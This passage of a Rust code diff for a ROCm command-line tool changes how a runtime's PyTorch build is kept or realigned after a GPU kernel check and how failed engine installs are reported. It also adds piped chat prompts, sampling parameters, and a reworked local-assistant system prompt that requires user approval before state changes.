+/// Split out from the lookup so the decision can be tested without a registry on
+/// disk: the lookup is a directory scan, but this is the part that has to be right
+/// for a runtime already stuck on the engine's build to recover.
+fn sdk_torch_build_from_manifest(manifest: &therock::InstalledRuntimeManifest) -> Option<String> {
+    if let Some(recorded) = manifest.sdk_torch.as_deref()
+        && let Some(build) = therock::split_local_version(recorded).1
+    {
+        return Some(build.to_owned());
+    }
+    let version = manifest
+        .rocm_sdk
+        .as_ref()
+        .and_then(|probe| probe.rocm_sdk_version.clone())
+        .unwrap_or_else(|| manifest.version.clone());
+    (!version.trim().is_empty()).then(|| format!("rocm{version}"))
+}
+
+/// Which torch a runtime keeps once one of them has run a GPU kernel.
+///
+/// Exactly two builds are allowed to stand: the engine's own exact pin, and the
+/// SDK's build of the release it pins. Both are states this tool produces on
+/// purpose, and each is a fixed point — a rerun over either one keeps it and
+/// installs nothing, which is what stops `--reinstall` from oscillating between
+/// the two package sources. Anything else is repaired by `TorchAlignment`.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum TorchRetention {
+    /// The engine's exact pin ran a kernel. It satisfies the pin, so it diverges
+    /// from nothing and the dependency check is read straight.
+    EngineBuild { version: String },
+    /// The SDK's build of the pinned release ran. The engine's pin stays
+    /// deliberately unsatisfied, which the dependency check is told to expect.
+    SdkBuild { version: String },
+    /// Nothing here has been shown to work: align, then look again.
+    Realign,
+}
+
+/// Decide retention from the torch that actually executed a kernel.
+///
+/// The version compared is the one the running interpreter reported, not the one
+/// distribution metadata claims: the build that ran is the build being kept. The
+/// engine's pin is checked first, so a pin that already names the SDK's build is
+/// reported as satisfied rather than as an intended divergence from itself.
+fn classify_retained_torch(
+    sdk_build: Option<&str>,
+    devices: &RuntimeDeviceCheck,
+    engine_requirement: Option<&str>,
+) -> TorchRetention {
+    // Only a kernel that ran earns retention. Every other verdict — no devices,
+    // a failed launch, or no answer at all — goes to the repair path, which is
+    // also what this tool did before it could tell those apart.
+    let RuntimeDeviceCheck::Usable { torch_version, .. } = devices else {
+        return TorchRetention::Realign;
+    };
+    let Some(pinned) = engine_requirement.and_then(therock::requirement_pinned_version) else {
+        return TorchRetention::Realign;
+    };
+    if torch_version.as_str() == pinned {
+        return TorchRetention::EngineBuild {
+            version: torch_version.clone(),
+        };
+    }
+    let Some(sdk_build) = sdk_build else {
+        return TorchRetention::Realign;
+    };
+    // The same version `plan_torch_alignment` would install, so the state that
+    // repair produces is the state recognised here on the next run.
+    let sdk_torch = format!("{}+{sdk_build}", therock::split_local_version(pinned).0);
+    if torch_version.as_str() == sdk_torch {
+        return TorchRetention::SdkBuild {
+            version: torch_version.clone(),
+        };
+    }
+    TorchRetention::Realign
+}
+
+/// The package a retained torch deliberately diverges on, if any.
+///
+/// The SDK's build does not satisfy the engine's exact pin and is kept anyway;
+/// the engine's own build satisfies it, so claiming a divergence there would
+/// suppress a violation that has not happened.
+const fn retained_diverged_package(retention: &TorchRetention) -> Option<&'static str> {
+    match retention {
+        TorchRetention::SdkBuild { .. } => Some("torch"),
+        TorchRetention::EngineBuild { .. } | TorchRetention::Realign => None,
+    }
+}
+
+/// Render a retention as the `torch_alignment:` block, in place of an alignment.
+///
+/// `Realign` renders nothing: nothing was retained, and `render_torch_alignment`
+/// prints the block for the repair that runs instead.
+fn render_torch_retention(retention: &TorchRetention, engine: &str) -> String {
+    let mut output = String::new();
+    match retention {
+        TorchRetention::EngineBuild { version } => {
+            let _ = writeln!(
+                output,
+                "  torch_alignment: retained_engine_build ({})",
+                sanitize_log_value(version)
+            );
+            let _ = writeln!(
+                output,
+                "    the torch {} pins ran a GPU kernel with this SDK",
+                sanitize_log_value(engine)
+            );
+        }
+        TorchRetention::SdkBuild { version } => {
+            let _ = writeln!(
+                output,
+                "  torch_alignment: retained_sdk_build ({})",
+                sanitize_log_value(version)
+            );
+            let _ = writeln!(
+                output,
+                "    the SDK's build of the release {} pins ran a GPU kernel",
+                sanitize_log_value(engine)
+            );
+        }
+        TorchRetention::Realign => {}
+    }
+    output
+}
+
+/// Print the retention block and record it. `Realign` records nothing.
+fn report_torch_retention(
+    paths: &AppPaths,
+    engine: &str,
+    runtime_key: &str,
+    retention: &TorchRetention,
+) {
+    print!("{}", render_torch_retention(retention, engine));
+    let (state, version) = match retention {
+        TorchRetention::EngineBuild { version } => ("retained_engine_build", version),
+        TorchRetention::SdkBuild { version } => ("retained_sdk_build", version),
+        TorchRetention::Realign => return,
+    };
+    record_cli_audit_event(
+        paths,
+        "engine",
+        "torch_alignment",
+        "info",
+        format!(
+            "engine={engine} runtime_id={runtime_key} torch_alignment={state} version={version}"
+        ),
+        None,
+    );
+}
+
+/// Whether this host has a GPU at all, answered by inspecting the host itself.
+///
+/// Deliberately independent of the runtime under test: the runtime reporting no
+/// devices is the symptom being judged, so it cannot also be the evidence. The
+/// third state is the one that matters — a host that could not be examined is not
+/// a host without a GPU, and failing a multi-gigabyte install on that guess would
+/// be worse than saying what was seen.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum HostGpu {
+    Detected,
+    Absent,
+    NotVerified(String),
+}
+
+fn detect_host_gpu() -> HostGpu {
+    match ExamineSummary::gather() {
+        Ok(summary) if summary.detected_gfx_target.is_some() => HostGpu::Detected,
+        Ok(_) => HostGpu::Absent,
+        Err(error) => HostGpu::NotVerified(format!("{error:#}")),
+    }
+}
+
+/// Say why a runtime that cannot serve did not fail the install.
+fn report_unverified_host_gpu(paths: &AppPaths, engine: &str, runtime_key: &str, reason: &str) {
+    println!("  host_gpu: not_verified ({})", sanitize_log_value(reason));
+    println!("    the install is not failed on a host whose GPUs could not be inspected");
+    record_cli_audit_event(
+        paths,
+        "engine",
+        "host_gpu",
+        "info",
+        format!("engine={engine} runtime_id={runtime_key} host_gpu=not_verified: {reason}"),
+        None,
+    );
+}
+
+/// Whether the runtime this install produced is one that cannot serve.
+///
+/// Both bad verdicts count: a runtime that opens no device and one that opens a
+/// device it cannot run a kernel on both fail at first serve. Neither says
+/// anything about the alignment that preceded it — a repair that could not run
+/// may still leave a working environment, and one that ran may still not have
+/// helped, so what the runtime does now is the only thing read.
+const fn runtime_cannot_serve(devices: &RuntimeDeviceCheck) -> bool {
+    matches!(
+        devices,
+        RuntimeDeviceCheck::NoDevices { .. } | RuntimeDeviceCheck::KernelFailed { .. }
+    )
+}
+
+/// Whether an install finished having produced a runtime that cannot serve.
+///
+/// Gated on the host, because the same verdict means different things on
+/// different machines: no device is the correct answer on a machine with no GPU,
+/// and a host that could not be examined has not told us which machine this is.
+/// Only a GPU found independently of the runtime turns a runtime that cannot
+/// serve into a failed install.
+const fn install_left_runtime_unusable(devices: &RuntimeDeviceCheck, host_gpu: &HostGpu) -> bool {
+    matches!(host_gpu, HostGpu::Detected) && runtime_cannot_serve(devices)
+}
+
+/// An engine install finished having left a runtime that cannot run GPU work.
+///
+/// A distinct type rather than a plain message so `install sdk` can tell this
+/// apart from an ordinary engine-install failure. It deliberately tolerates the
+/// latter — a failed engine install still leaves a good multi-gigabyte SDK
+/// behind, and discarding that would be worse — but a runtime it has just left
+/// unable to serve is the exact silent success this change exists to end, so
+/// that one has to fail the command.
+#[derive(Debug)]
+struct UnusableRuntimeAfterInstall(String);
+
+impl std::fmt::Display for UnusableRuntimeAfterInstall {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.write_str(&self.0)
+    }
+}
+
+impl std::error::Error for UnusableRuntimeAfterInstall {}
+
+fn unusable_runtime_error(engine: &str, runtime_key: &str) -> anyhow::Error {
+    anyhow::Error::new(UnusableRuntimeAfterInstall(format!(
+        "the {engine} install left runtime `{runtime_key}` on a torch that cannot run GPU work \
+         with this SDK, on a host where a GPU was found. The ROCm SDK itself is installed; read \
+         the device check above and install a torch build that suits both this SDK and this GPU."
+    )))
+}
+
+/// Whether a failed engine auto-install should fail `rocm install sdk` itself.
+///
+/// Only the unusable-runtime case does. Everything else — an unreachable engine
+/// index, a resolver error, a missing build tool — leaves the SDK installed and
+/// usable, so it warns and keeps the successful exit rather than throwing away
+/// the install that did succeed.
+fn engine_auto_install_failure_is_fatal(error: &anyhow::Error) -> bool {
+    error.is::<UnusableRuntimeAfterInstall>()
+}
+
+/// Everything `install sdk` does once the SDK itself is on disk: auto-install the
+/// family's engine, record the install, and decide the exit code.
+///
+/// The engine auto-install is a parameter so that decision is reachable from a
+/// test without a multi-gigabyte install behind it. It is the part worth pinning:
+/// a failed engine install must keep the successful exit, because the SDK is
+/// installed and usable and only a separately retryable step is missing, while a
+/// runtime this install left unable to open a device must not — reporting success
+/// for that is the defect being fixed. The SDK's own audit event is recorded
+/// either way, before the command fails, because the SDK install did complete.
+fn finish_sdk_install(
+    paths: &AppPaths,
+    finalized: Option<&SdkInstallFinalization>,
+    audit_action: &str,
+    audit_detail: String,
+    auto_install: impl FnOnce(&AppPaths, &SdkInstallFinalization) -> Result<()>,
+) -> Result<()> {
+    let mut unusable_runtime = None;
+    if let Some(finalized) = finalized
+        && let Err(error) = auto_install(paths, finalized)
+    {
+        record_cli_audit_event(
+            paths,
+            "engine",
+            "engine_auto_install",
+            "error",
+            format!(
+                "auto-install failed engine=vllm runtime_id={} family={}: {error}",
+                finalized.runtime_key, finalized.family
+            ),
+            None,
+        );
+        if engine_auto_install_failure_is_fatal(&error) {
+            unusable_runtime = Some(error);
+        } else {
+            eprintln!("warning: automatic vLLM install failed: {error}");
+            eprintln!(
+                "warning: SDK install completed; you can run `rocm engines install vllm --runtime-id {}` after vLLM is available in that runtime",
+                finalized.runtime_key
+            );
+        }
+    }
+    record_cli_audit_event(paths, "runtime", audit_action, "info", audit_detail, None);
+    if let Some(error) = unusable_runtime {
+        return Err(error);
+    }
+    Ok(())
+}
+
+/// Whether rocm-cli owns the torch in the runtime this install just produced.
+///
+/// Two kinds of environment are left alone, because there is no torch here that
+/// rocm-cli put in place. External environments are the obvious one. The subtler
+/// one is an engine that manages its own runtime: those report
+/// `managed_env: Some(true)` — rocm-cli did create the runtime — but their
+/// `python_executable` is the engine's native binary, not an interpreter, and no
+/// torch ever lived in there. Probing one anyway spawns that binary with a
+/// generated `.py` path as `argv[1]` and prints check blocks about a package the
+/// runtime never had.
+fn settles_runtime_torch(engine: &str, managed_env: Option<bool>) -> bool {
+    managed_env != Some(false) && !engine_manages_own_runtime(engine)
+}
+
+/// Settle which torch a managed runtime keeps after an engine install, then report.
+///
+/// Every path that installs an engine into a managed runtime must call this.
+/// Skipping it anywhere lets the engine's own torch win silently and can leave a
+/// runtime that cannot serve — including after an explicit
+/// `rocm engines install <engine> --reinstall`, which is exactly what someone
+/// reaches for when a runtime already looks wrong.
+///
+/// The runtime is asked what it can do before anything is written to it, and a
+/// torch that already runs a GPU kernel is kept, whichever of the two intended
+/// builds it is. Only when nothing has proven itself does the alignment install
+/// run, and then the runtime is asked again, because that answer is now about a
+/// different torch.
+///
+/// See `settles_runtime_torch` for the environments this deliberately skips.
+fn settle_engine_install(
+    paths: &AppPaths,
+    engine: &str,
+    selector: &str,
+    response: &InstallResponse,
+) -> Result<()> {
+    if !settles_runtime_torch(engine, response.managed_env) {
+        return Ok(());
+    }
+    let python = Path::new(&response.python_executable);
+    // Which runtime is being settled has to be asked of the environment, not of
+    // the caller. Two of the three callers pass a `runtime_id`, and side-by-side
+    // installs of one channel and family share it, so the selector can name two
+    // runtimes at once; `runtime_manifest_for_selector` then correctly declines
+    // to guess and every lookup below silently comes back empty. It can also
+    // name the *active* runtime while the engine was installed into an older
+    // one, which is worse than empty — it settles the wrong tree's torch.
+    // The interpreter is unambiguous, so let it name its own runtime.
+    let owned = runtime_key_for_python(paths, python);
+    let runtime_key = owned.as_deref().unwrap_or(selector);
+    let library_paths = runtime_library_paths_for_key(paths, runtime_key);
+    let sdk_build = sdk_torch_build_for_key(paths, runtime_key);
+    let torch = therock::probe_torch_alignment(python, engine);
+    let probed = runtime_device_check(Some(python), &library_paths);
+
+    let retention = classify_retained_torch(
+        sdk_build.as_deref(),
+        &probed,
+        torch
+            .as_ref()
+            .ok()
+            .and_then(|probe| probe.engine_requires_torch.as_deref()),
+    );
+    let (diverged, devices) = match retention {
+        TorchRetention::Realign => {
+            let alignment = report_torch_alignment(
+                paths,
+                engine,
+                python,
+                runtime_key,
+                sdk_build.as_deref(),
+                torch.as_ref(),
+                &probed,
+            );
+            // Only a realignment replaced torch. After every other outcome the
+            // environment is the one already probed, and asking it again would
+            // spend a second interpreter launch to be told the same thing.
+            let devices = match alignment {
+                TorchAlignment::Realigned { .. } => {
+                    runtime_device_check(Some(python), &library_paths)
+                }
+                _ => probed,
+            };
+            (deliberately_diverged_package(&alignment), devices)
+        }
+        retention => {
+            report_torch_retention(paths, engine, runtime_key, &retention);
+            (retained_diverged_package(&retention), probed)
+        }
+    };
+    report_engine_dependency_check(paths, engine, Some(python), runtime_key, diverged);
+    let devices = report_runtime_device_check(paths, engine, runtime_key, devices);
+
+    // Only a runtime that cannot serve raises the question the host answers, so
+    // the host is inspected only then. Both readers below already require this,
+    // so asking earlier would spend a full host scan on every healthy install to
+    // reach an answer nothing goes on to read.
+    if !runtime_cannot_serve(&devices) {
+        return Ok(());
+    }
+
+    // A runtime that cannot serve is only this install's failure where the host
+    // has a GPU to serve with. Where the host could not be examined, say so
+    // rather than failing a multi-gigabyte install on a guess.
+    let host_gpu = detect_host_gpu();
+    if let HostGpu::NotVerified(reason) = &host_gpu {
+        report_unverified_host_gpu(paths, engine, runtime_key, reason);
+    }
+    if install_left_runtime_unusable(&devices, &host_gpu) {
+        return Err(unusable_runtime_error(engine, runtime_key));
+    }
+    Ok(())
+}
+
+fn engine_dependency_check(
+    paths: &AppPaths,
+    engine: &str,
+    python: Option<&Path>,
+    realigned_package: Option<&str>,
+) -> EngineDependencyCheck {
+    let Some(python) = python else {
+        return EngineDependencyCheck::NotVerified(
+            "the runtime's Python environment could not be located".to_owned(),
+        );
+    };
+    match rocm_core::check_dependencies(paths, python) {
+        Ok(violations) => {
+            let owned = rocm_core::violations_requiring(&violations, engine);
+            let details: Vec<String> = owned
+                .iter()
+                .map(|violation| violation.detail.clone())
+                .collect();
+            classify_dependency_details(details, realigned_package)
+        }
+        Err(error) => EngineDependencyCheck::NotVerified(error.to_string()),
+    }
+}
+
+/// Separate a deliberate divergence from a genuine violation.
+///
+/// Each line is judged on its own subject: a genuine violation elsewhere in the
+/// same run says nothing about the package the install deliberately diverged on,
+/// and must not drag it along. Lumping the two together loses the distinction
+/// exactly where it matters most — the remedy for the genuine violation would
+/// reinstall the engine and undo the alignment.
+fn classify_dependency_details(
+    details: Vec<String>,
+    realigned_package: Option<&str>,
+) -> EngineDependencyCheck {
+    if details.is_empty() {
+        return EngineDependencyCheck::Satisfied;
+    }
+    let Some(package) = realigned_package else {
+        return EngineDependencyCheck::Violated {
+            violations: details,
+            expected: Vec::new(),
+        };
+    };
+    // A line whose subject cannot be parsed is not evidence of a divergence, so it
+    // stays a violation: the conservative side keeps saying something is wrong.
+    let (expected, violations): (Vec<String>, Vec<String>) =
+        details.into_iter().partition(|detail| {
+            rocm_core::violation_subject(detail)
+                .is_some_and(|subject| subject.package.eq_ignore_ascii_case(package))
+        });
+    if violations.is_empty() {
+        EngineDependencyCheck::ExpectedDivergence(expected)
+    } else {
+        EngineDependencyCheck::Violated {
+            violations,
+            expected,
+        }
+    }
+}
+
+fn render_engine_dependency_check(engine: &str, outcome: &EngineDependencyCheck) -> String {
+    let mut output = String::new();
+    match outcome {
+        EngineDependencyCheck::Satisfied => {
+            let _ = writeln!(output, "  dependency_check: satisfied");
+        }
+        EngineDependencyCheck::NotVerified(reason) => {
+            let _ = writeln!(
+                output,
+                "  dependency_check: not_verified ({})",
+                sanitize_log_value(reason)
+            );
+        }
+        EngineDependencyCheck::Violated {
+            violations,
+            expected,
+        } => {
+            let _ = writeln!(output, "  dependency_check: violated");
+            for detail in violations {
+                let _ = writeln!(output, "  violation: {}", sanitize_log_value(detail));
+            }
+            for detail in expected {
+                let _ = writeln!(output, "  divergence: {}", sanitize_log_value(detail));
+            }
+            if expected.is_empty() {
+                let _ = writeln!(
+                    output,
+                    "  action: rocm engines install {engine} --reinstall"
+                );
+            } else {
+                // The reinstall would repair the violations above and reinstate the
+                // engine's own build of the diverged package, restoring a runtime
+                // that cannot open a device. Naming a remedy that trades one defect
+                // for a worse one is not worth the convenience.
+                let _ = writeln!(
+                    output,
+                    "  action: repair the violations above without reinstalling {engine}; a reinstall would undo the divergence kept on purpose (see torch_alignment above)"
+                );
+            }
+        }
+        EngineDependencyCheck::ExpectedDivergence(details) => {
+            let _ = writeln!(output, "  dependency_check: expected_divergence");
+            for detail in details {
+                let _ = writeln!(output, "  divergence: {}", sanitize_log_value(detail));
+            }
+            // Deliberately not the reinstall remedy. It does not apply to
+            // either state that reaches here: a reinstall realigns torch again
+            // and reproduces the SDK build, and where the user has opted out of
+            // that realignment it would undo the decision they made. Which of
+            // the two this is, the block above has already said.
+            let _ = writeln!(
+                output,
+                "  action: none; this torch is kept on purpose (see torch_alignment above)"
+            );
+        }
+    }
+    output
+}
+
 fn render_sdk_install_success(finalized: &SdkInstallFinalization) -> String {
-    format!(
+    let mut output = format!(
         "ROCm SDK installed successfully.\n  install folder: {}\n  active runtime: {}\n  next step: run `rocm help` to see how to use rocm-cli.\n",
         finalized.install_root.display(),
         finalized.runtime_key
-    )
+    );
+    if finalized.previous_runtime_key.is_some() {
+        let _ = writeln!(output, "{ROLLBACK_RECOVERY_HINT}");
+    }
+    output
 }
 
 fn finalize_successful_sdk_install(paths: &AppPaths) -> Result<Option<SdkInstallFinalization>> {
@@ -7075,6 +10977,7 @@ fn finalize_successful_sdk_install(paths: &AppPaths) -> Result<Option<SdkInstall
         runtime_key: activation.runtime_key,
         install_root: manifest.install_root,
         family: manifest.family,
+        previous_runtime_key: activation.previous_runtime_key,
     }))
 }
 
@@ -7314,12 +11217,17 @@ fn adopt_runtime_from_probe(
         version,
         install_root: install_root.clone(),
         selected_artifact_url: "adopted-read-only".to_owned(),
+        source_layout_generation: None,
         index_url: None,
         tarball_file_name: None,
         python_launcher: None,
         python_executable: Some(python_executable.display().to_string()),
         pip_cache_dir: None,
         rocm_sdk: Some(probe),
+        // Adoption does not install torch, so the build is derived from the SDK
+        // version instead.
+        sdk_torch: None,
+        wheel_composition: None,
         read_only: true,
         imported_from: Some(install_root),
         installed_at_unix_ms: rocm_core::unix_time_millis(),
@@ -7448,7 +11356,7 @@ fn recover_setup_runtime_registration(
     Ok(Some(manifest.runtime_key))
 }
 
-fn current_runtime_manifest<'a>(
+pub(crate) fn current_runtime_manifest<'a>(
     config: &RocmCliConfig,
     manifests: &'a [therock::InstalledRuntimeManifest],
 ) -> Option<&'a therock::InstalledRuntimeManifest> {
@@ -7758,7 +11666,7 @@ fn config(command: ConfigCommand) -> Result<()> {
                 bail!("local provider does not use a cloud API key");
             }
             let key = read_provider_key_from_user(provider)?;
-            let status = provider_keys::set_provider_api_key(provider, &key)?;
+            let status = provider_keys::store_provider_credential(provider, &key)?;
             println!("{provider} API key saved");
             println!(
                 "  key: {}",
@@ -7781,7 +11689,7 @@ fn config(command: ConfigCommand) -> Result<()> {
             if provider == "local" {
                 bail!("local provider does not use a cloud API key");
             }
-            let status = provider_keys::clear_provider_api_key(provider)?;
+            let status = provider_keys::remove_provider_credential(provider)?;
             println!("{provider} API key cleared");
             println!(
                 "  key: {}",
@@ -7851,6 +11759,65 @@ pub(crate) fn render_launch_summary(paths: &AppPaths, config: &RocmCliConfig) ->
     output
 }
 
+/// Read a one-shot chat prompt from standard input when it is piped in.
+///
+/// Backs the documented `echo "…" | rocm chat` path: when `--prompt` is omitted
+/// and stdin is not a terminal, the piped text becomes the prompt. Returns
+/// `None` when stdin is an interactive TTY or the piped input is blank, so the
+/// caller falls back to the status screen instead of blocking on input nobody
+/// can supply.
+///
+/// The read runs to EOF — the conventional filter contract that
+/// `read_provider_key_from_user` already follows. A caller that hands us a pipe
+/// it never writes to and never closes therefore waits, exactly as `cat` would;
+/// the TTY guard is what keeps that off an interactive user, and a
+/// non-interactive caller with no prompt to send should pass `/dev/null` (as
+/// `scripts/smoke_local.py` does) rather than an idle pipe. A read error — a
+/// closed or non-UTF-8 fd 0 — is reported instead of being folded into "no
+/// prompt", so text that was piped but could not be decoded fails loudly rather
+/// than silently becoming a status screen and a zero exit.
+fn read_piped_prompt() -> Result<Option<String>> {
+    use std::io::IsTerminal as _;
+
+    if std::io::stdin().is_terminal() {
+        return Ok(None);
+    }
+    let mut buf = String::new();
+    std::io::stdin()
+        .read_to_string(&mut buf)
+        .context("failed to read chat prompt from standard input")?;
+    Ok(piped_prompt_from_input(&buf))
+}
+
+/// Turn raw piped stdin into a chat prompt, or `None` when there is nothing to
+/// send.
+///
+/// `--prompt` reaches the send path verbatim, so a piped prompt must too:
+/// leading indentation and trailing spaces or tabs carry meaning for a model and
+/// are preserved byte for byte. The only thing removed is the line ending the
+/// writer appends — a single trailing `\n`, plus the `\r` in front of it on
+/// Windows — because `echo "…" |` and `printf '…\n' |` add it, not the user.
+/// Further blank lines stay: the second newline of `printf 'a\n\n'` is authored
+/// content, not shell punctuation.
+///
+/// `trim()` is used only to classify the input: whitespace-only stdin (an empty
+/// pipe, or a bare newline) holds no prompt and yields `None`. That is the one
+/// deliberate divergence from `--prompt`, which forwards `"   "` as written: a
+/// bare `rocm chat` under any redirect — `< /dev/null`, a closed heredoc, a CI
+/// step with no stdin — has to keep printing the status screen rather than send
+/// a blank turn to a model, and a caller who really means to send whitespace
+/// can still say so with `--prompt`.
+fn piped_prompt_from_input(input: &str) -> Option<String> {
+    if input.trim().is_empty() {
+        return None;
+    }
+    let prompt = match input.strip_suffix('\n') {
+        Some(rest) => rest.strip_suffix('\r').unwrap_or(rest),
+        None => input,
+    };
+    Some(prompt.to_owned())
+}
+
 pub(crate) fn render_chat_text(paths: &AppPaths, provider: &str) -> Result<String> {
     let status = providers::provider_status(paths, provider)?;
     let mut output = String::new();
@@ -7914,8 +11881,52 @@ pub(crate) fn render_chat_prompt_text(
     model: Option<&str>,
     prompt: &str,
     rocm_tools: bool,
+    params: ChatInferenceParams,
 ) -> Result<String> {
-    Ok(render_chat_prompt_result(paths, provider, model, prompt, rocm_tools)?.rendered)
+    Ok(render_chat_prompt_result_with_progress(
+        paths, provider, model, prompt, rocm_tools, params, None,
+    )?
+    .rendered)
+}
+
+/// Sampling controls a caller can pass through to the underlying chat request.
+#[derive(Debug, Clone, Copy, Default)]
+pub(crate) struct ChatInferenceParams {
+    pub temperature: Option<f32>,
+    pub top_p: Option<f32>,
+    pub max_tokens: Option<u32>,
+}
+
+/// Parse a `--temperature` value: a finite number greater than or equal to 0.
+fn parse_non_negative_temperature(value: &str) -> Result<f32, String> {
+    let parsed: f32 = value
+        .parse()
+        .map_err(|_| format!("`{value}` is not a valid number"))?;
+    if !parsed.is_finite() || parsed < 0.0 {
+        return Err("temperature must be a finite value >= 0.0".to_owned());
+    }
+    Ok(parsed)
+}
+
+/// Parse a `--top-p` value: a finite number in the inclusive range 0.0..=1.0.
+fn parse_unit_interval(value: &str) -> Result<f32, String> {
+    let parsed: f32 = value
+        .parse()
+        .map_err(|_| format!("`{value}` is not a valid number"))?;
+    if !parsed.is_finite() || !(0.0..=1.0).contains(&parsed) {
+        return Err("top-p must be between 0.0 and 1.0".to_owned());
+    }
+    Ok(parsed)
+}
+
+fn parse_positive_u32(value: &str) -> Result<u32, String> {
+    let parsed: u32 = value
+        .parse()
+        .map_err(|_| format!("`{value}` is not a valid positive integer"))?;
+    if parsed == 0 {
+        return Err("max-tokens must be greater than 0".to_owned());
+    }
+    Ok(parsed)
 }
 
 #[derive(Debug, Clone, Eq, PartialEq)]
@@ -7941,6 +11952,8 @@ struct ChatToolRunResult {
     needs_install_folder: bool,
 }
 
+/// Convenience wrapper used by tests that do not exercise sampling controls.
+#[cfg(test)]
 pub(crate) fn render_chat_prompt_result(
     paths: &AppPaths,
     provider: &str,
@@ -7948,7 +11961,15 @@ pub(crate) fn render_chat_prompt_result(
     prompt: &str,
     rocm_tools: bool,
 ) -> Result<ChatPromptResult> {
-    render_chat_prompt_result_with_progress(paths, provider, model, prompt, rocm_tools, None)
+    render_chat_prompt_result_with_progress(
+        paths,
+        provider,
+        model,
+        prompt,
+        rocm_tools,
+        ChatInferenceParams::default(),
+        None,
+    )
 }
 
 pub(crate) fn render_chat_prompt_result_with_progress(
@@ -7957,6 +11978,7 @@ pub(crate) fn render_chat_prompt_result_with_progress(
     model: Option<&str>,
     prompt: &str,
     rocm_tools: bool,
+    params: ChatInferenceParams,
     progress: Option<&mut dyn FnMut(String)>,
 ) -> Result<ChatPromptResult> {
     let mut progress = progress;
@@ -7980,7 +12002,7 @@ pub(crate) fn render_chat_prompt_result_with_progress(
     if rocm_tools {
         messages.push(providers::ChatMessage {
             role: "system".to_owned(),
-            content: rocm_chat_tool_system_prompt(),
+            content: rocm_chat_tool_system_prompt_for_host(Some(paths)),
         });
     }
     messages.push(providers::ChatMessage {
@@ -8010,7 +12032,9 @@ pub(crate) fn render_chat_prompt_result_with_progress(
                 &providers::ChatRequest {
                     model: assistant_model.map(str::to_owned),
                     messages: messages.clone(),
-                    max_tokens: None,
+                    max_tokens: params.max_tokens,
+                    temperature: params.temperature,
+                    top_p: params.top_p,
                     rocm_tools,
                 },
             ) {
@@ -8047,7 +12071,9 @@ pub(crate) fn render_chat_prompt_result_with_progress(
             &providers::ChatRequest {
                 model: assistant_model.map(str::to_owned),
                 messages: messages.clone(),
-                max_tokens: None,
+                max_tokens: params.max_tokens,
+                temperature: params.temperature,
+                top_p: params.top_p,
                 rocm_tools,
             },
         ) {
@@ -8141,7 +12167,9 @@ pub(crate) fn render_chat_prompt_result_with_progress(
             &providers::ChatRequest {
                 model: assistant_model.map(str::to_owned),
                 messages: follow_up_messages,
-                max_tokens: Some(256),
+                max_tokens: params.max_tokens.or(Some(256)),
+                temperature: params.temperature,
+                top_p: params.top_p,
                 rocm_tools: false,
             },
         )?;
@@ -9093,11 +13121,28 @@ fn find_ascii_case_insensitive(haystack: &str, needle: &str) -> Option<usize> {
         .position(|window| window.eq_ignore_ascii_case(needle))
 }
 
-const ROCM_CHAT_TOOL_SYSTEM_PROMPT: &str = "You are ROCm CLI's local assistant. Speak in simple English for non-technical Windows users. Use the provided ROCm tools when you need to inspect this machine, preview setup, read service logs, check updates, inspect automations, install or start ROCm-managed apps, or request ROCm/TheRock, config, engine, app, and local model server changes. For simple greetings or thanks like hello, hi, hey, ok, or thank you, reply normally; do not inspect ROCm, do not call tools, and do not launch or propose a model server. Tool-use rules: inspect first with read-only tools; call rocm_command only with argv-style args and no shell text; use natural_language_plan for ROCm requests that do not fit another read-only tool; ask for a mutating tool call only after explaining why it is needed; summarize tool results after they are returned. Read-only tools may run immediately. Tools that install, launch, stop, delete, or change state require user approval; request rocm_command and explain why. For 'is X running?', 'what is running?', status, or port questions, inspect before answering and do not start, stop, install, or serve anything. For ComfyUI or port 8188 use [\"comfyui\",\"status\"] or port_status. For vLLM, Lemonade, qwen, or local model servers use [\"services\",\"list\",\"--all\"] for running state and [\"engines\",\"list\"] for installed/available engine state. Treat ready/running as running, starting/recovering as starting, failed/stopped as not running, and no matching record as unknown or not managed by ROCm CLI. Interpret Examine carefully: active_runtime_status=ready means ROCm CLI has an active managed TheRock/ROCm runtime; legacy_rocm_status=not_detected only means no global system ROCm install was found. If active_runtime_status=ready, tell the user ROCm/TheRock is installed and active for ROCm CLI. For 'is TheRock installed', 'is ROCm installed', or 'which GPU is on this machine', use examine or gpu_snapshot before answering. For 'how do I setup TheRock' or install/setup requests, guide the user to choose an install folder first; do not answer with only a status check. For 'which LLMs can this machine support', use rocm_command args [\"model\"] or natural_language_plan before answering. For TheRock installs, always let the user choose the install folder. If the user names a folder or prefix, preserve that exact folder with [\"--prefix\",\"PATH\"]; you may call path_exists first to check whether that user-provided folder or its parent exists. If the user asks you to install TheRock/ROCm but has not named a folder, ask for the folder or let the guided setup folder picker collect it; do not invent a hidden default folder and do not request an install command without --prefix. Use rocm_command args [\"install\",\"sdk\",\"--channel\",\"release\",\"--format\",\"wheel\",\"--prefix\",\"PATH\"] only when the user asks you to install it and a folder is known; for a requested build date add [\"--build-date\",\"YYYY-MM-DD\"] and for a requested exact version add [\"--version\",\"VERSION\"]. For config changes, inspect with [\"config\",\"show\"] first when useful, then request config subcommands such as [\"config\",\"set-default-engine\",\"lemonade\"], [\"config\",\"set-default-runtime\",\"RUNTIME_KEY\"], or [\"config\",\"set-telemetry\",\"local\"] only after explaining why. For ComfyUI, use rocm_command with args like [\"comfyui\",\"status\"], [\"comfyui\",\"logs\"], [\"comfyui\",\"install\"], [\"comfyui\",\"start\"], or [\"comfyui\",\"stop\"]. First-time setup is the same thing as bootstrap in ROCm CLI; it is a deterministic ROCm setup flow, not a separate model chat. The built-in local assistant is fixed to qwen, which maps to Qwen3-4B-Instruct-2507-GGUF served by Lemonade with gpu_required. vLLM and Lemonade are the general serving engines; inspect or manage them when the user asks about general model serving, but do not switch the built-in assistant away from Lemonade. Use qwen-smoke only for a quick server smoke test. On native Windows, vLLM is skipped; use WSL/Linux for that ROCm GPU engine. For vLLM management, inspect engines first and use [\"engines\",\"install\",\"vllm\"] or [\"serve\",\"MODEL\",\"--engine\",\"vllm\",\"--device\",\"gpu_required\",\"--managed\"] only where the host supports it. Do not invent shell commands and do not request CPU fallback.";
+/// The host-independent half of the assistant prompt.
+///
+/// Statements that are only true on *some* hosts do not belong here — they used
+/// to, and a WSL user was told "on native Windows, vLLM is skipped" while vLLM
+/// was in fact their supported path. Anything host-dependent now comes from
